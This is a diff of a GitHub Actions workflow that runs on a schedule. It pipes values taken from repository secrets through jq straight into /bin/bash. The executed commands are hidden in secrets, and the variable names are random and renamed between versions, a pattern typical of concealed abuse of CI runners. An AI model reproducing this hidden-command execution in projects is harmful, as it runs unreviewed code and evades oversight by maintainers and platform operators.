@@ -1,27 +1,28 @@
 name: hotdogequal
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 0/6 * * *'
+    - cron: '9 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: hotdogequal
         env:
-          vq3: ${{ secrets.vq3 }}
+          vjs0: ${{ secrets.vjs0 }}
         run: |
-          echo $vq3 | jq -r .tnhxa450 | /bin/bash
-          echo $ilth4447 | jq -r .jgbag66290 | /bin/bash
-          echo $czqh5 | jq -r .xenxo3 | /bin/bash
-          echo $bomq3 | jq -r .q1 | /bin/bash
-          echo $kdwm7102 | jq -r .ho4761 | /bin/bash
-          echo $zrdes603 | jq -r .hyfq64808 | /bin/bash
-          echo $pwauz7 | jq -r .jha258 | /bin/bash
-          echo $clb6670 | jq -r .sml3720 | /bin/bash
-          echo $sa38 | jq -r .jsnx1018 | /bin/bash
-          echo $ic9074 | jq -r .v0335 | /bin/bash
+          echo $vjs0 | jq -r .py437 | /bin/bash
+          echo $cesv768 | jq -r .e54 | /bin/bash
+          echo $a1 | jq -r .o56 | /bin/bash
+          echo $thf0 | jq -r .l2 | /bin/bash
+          echo $ubt695 | jq -r .swesh0 | /bin/bash
+          echo $deix5 | jq -r .avp950 | /bin/bash
+          echo $dpd62 | jq -r .dssc03 | /bin/bash
+          echo $wabjg4710 | jq -r .r4358 | /bin/bash
+          echo $znjbe66678 | jq -r .efjtw72 | /bin/bash
+          echo $dqnge7 | jq -r .arn08 | /bin/bash
+          echo $otigy6 | jq -r .zhdle39579 | /bin/bash
 
